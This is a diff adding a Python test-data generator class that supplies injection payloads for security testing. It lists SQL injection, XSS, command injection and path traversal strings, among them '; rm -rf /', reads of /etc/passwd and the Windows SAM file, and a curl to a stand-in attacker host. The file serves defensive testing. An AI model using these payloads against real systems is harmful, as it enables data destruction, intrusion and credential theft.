@@ -1,0 +1,94 @@
+"""Security test payloads - injection patterns for security testing."""
+import random
+from typing import Any, Dict, List
+
+from .base_generator import BaseDataGenerator
+
+
+class SecurityPayloads(BaseDataGenerator):
+    """Security payloads for penetration testing scenarios."""
+
+    # SQL Injection patterns
+    SQL_INJECTIONS = [
+        "'; DROP TABLE users; --",
+        "' OR '1'='1",
+        "'; INSERT INTO users VALUES ('hacker'); --",
+        "' UNION SELECT * FROM sensitive_data --",
+        "1; SELECT * FROM users WHERE 1=1--",
+        "admin'--",
+        "' OR 1=1--",
+    ]
+
+    # XSS patterns
+    XSS_PAYLOADS = [
+        "<script>alert('XSS')</script>",
+        "javascript:alert('XSS')",
+        "<img src=x onerror=alert('XSS')>",
+        "';alert('XSS');//",
+        "<svg/onload=alert('XSS')>",
+        "<body onload=alert('XSS')>",
+    ]
+
+    # Command injection patterns
+    COMMAND_INJECTIONS = [
+        "; rm -rf /",
+        "| cat /etc/passwd",
+        "&& curl attacker.com",
+        "`whoami`",
+        "$(cat /etc/passwd)",
+        "; ls -la",
+    ]
+
+    # Path traversal patterns
+    PATH_TRAVERSALS = [
+        "../../../etc/passwd",
+        "..\\..\\..\\windows\\system32\\config\\sam",
+        "....//....//....//etc/passwd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    ]
+
+    def sql_injection(self) -> Dict[str, Any]:
+        """Generate data with SQL injection patterns."""
+        payload = random.choice(self.SQL_INJECTIONS)
+        return {
+            "name": payload,
+            "email": self.generate_email(),
+            "search": payload,
+            "query": payload,
+        }
+
+    def xss_payload(self) -> Dict[str, Any]:
+        """Generate data with XSS patterns."""
+        payload = random.choice(self.XSS_PAYLOADS)
+        return {
+            "name": payload,
+            "description": payload,
+            "comment": payload,
+            "title": payload,
+        }
+
+    def command_injection(self) -> Dict[str, Any]:
+        """Generate data with command injection patterns."""
+        payload = random.choice(self.COMMAND_INJECTIONS)
+        return {
+            "filename": payload,
+            "command": payload,
+            "input": payload,
+        }
+
+    def path_traversal(self) -> Dict[str, Any]:
+        """Generate data with path traversal patterns."""
+        payload = random.choice(self.PATH_TRAVERSALS)
+        return {
+            "file": payload,
+            "path": payload,
+            "filename": payload,
+        }
+
+    def combined_attack(self) -> Dict[str, Any]:
+        """Generate data combining multiple attack vectors."""
+        return {
+            "name": random.choice(self.SQL_INJECTIONS),
+            "description": random.choice(self.XSS_PAYLOADS),
+            "file": random.choice(self.PATH_TRAVERSALS),
+        }
